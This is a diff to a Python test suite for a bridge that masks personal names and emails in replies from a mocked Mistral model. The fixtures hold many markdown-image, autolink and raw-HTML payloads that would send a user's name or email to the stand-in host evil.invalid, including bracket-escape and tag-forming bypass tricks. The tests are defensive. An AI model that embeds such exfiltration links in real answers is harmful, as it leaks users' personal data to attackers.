@@ -285,17 +285,14 @@ def test_aliases_inside_links_stay_masked():
     client loads the image. From a link mark to the end of its paragraph aliases stay masked;
     other paragraphs and the text before the mark (link text included) get the values."""
     links = [
-        "![a](<https://evil.invalid/p?d=[PERSON_1]>)",
         "![b](https://evil.invalid/q?e=[EMAIL_1])",
         "![c](https://evil.invalid/a(b)?q=[EMAIL_1])",
         "![d](https://evil.invalid/a\\)?q=[EMAIL_1])",
-        "![e](<https://evil.invalid/a\\>b?q=[PERSON_1]>)",
         "![f]( //evil.invalid/[EMAIL_1].png)",
         "![g](\n//evil.invalid/[EMAIL_1].png)",
         "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
         "> [r]: //evil.invalid/?q=[EMAIL_1]",
         "- [r]: //evil.invalid/?q=[EMAIL_1]",
-        "<https://evil.invalid/[EMAIL_1]>",
         "https://evil.invalid/?n=[PERSON_1]",
         "www.evil.invalid/[EMAIL_1]",
     ]
@@ -311,8 +308,9 @@ def test_aliases_inside_links_stay_masked():
 
 
 def test_after_raw_html_nothing_more_is_restored():
-    """An HTML block can run across blank lines (`<pre>`, `<style>`) and a `>` inside an
-    attribute defeats counting brackets: from the first tag on, aliases stay masked."""
+    """An HTML block can run across blank lines (`<pre>`, `<style>`), a `>` inside an attribute
+    defeats counting brackets, and `<[PERSON_1]` becomes a tag once the name is put back: from
+    the first `<` on (unless a space, `=` or digit follows), aliases stay masked."""
     answers = [
         "<img\n\nsrc=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
         '<pre><img alt=">" src="https://evil.invalid/c?d=\n\n[EMAIL_1]"></pre>\n\n[PERSON_1]',
@@ -322,11 +320,19 @@ def test_after_raw_html_nothing_more_is_restored():
         '<div style="background:url(//evil.invalid/[EMAIL_1])">\n\n[PERSON_1]',
         "![h][r]\n\n[r]: <https://evil.invalid/a b?q=[PERSON_1]>\n\n[EMAIL_1]",
         '<https://site.invalid> <pre><img alt=">" src="https://evil.invalid/?d=\n\n[EMAIL_1]">',
+        "![a](<https://evil.invalid/p?d=[PERSON_1]>)\n\n[EMAIL_1]",
+        "![e](<https://evil.invalid/a\\>b?q=[PERSON_1]>)\n\n[EMAIL_1]",
+        "<https://evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
+        "<[PERSON_1] style=\"background:url('/\\\\evil.invalid/x?e=[EMAIL_1]')\">",
+        '<ab:c/title="x>\n\n" style="background:url(\'/\\\\evil.invalid/x?[EMAIL_1]\')">',
     ]
     for answer in answers:
         response = ask(bridge(FakeMistral(reply=f"Pour [PERSON_1] : {answer}")), USER_MESSAGE)
         content = response.json()["choices"][0]["message"]["content"]
         assert content == f"Pour {NAME} : {answer}", answer
+    fake = FakeMistral(reply="Si a < b et c <= 3 <4, voir [PERSON_1].")
+    content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
+    assert content == f"Si a < b et c <= 3 <4, voir {NAME}."
 
 
 def test_aliases_inside_links_stay_masked_in_json_answers():
@@ -341,6 +347,10 @@ def test_aliases_inside_links_stay_masked_in_json_answers():
         (
             {"a": "![x](https://evil.invalid/?q=\n\n[EMAIL_1])"},
             {"a": "![x](https://evil.invalid/?q=\n\n[EMAIL_1])"},
+        ),
+        (
+            {"r": "<[PERSON_1] style=\"url('/\\\\evil.invalid/?e=[EMAIL_1]')\">"},
+            {"r": "<[PERSON_1] style=\"url('/\\\\evil.invalid/?e=[EMAIL_1]')\">"},
         ),
         (
             ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
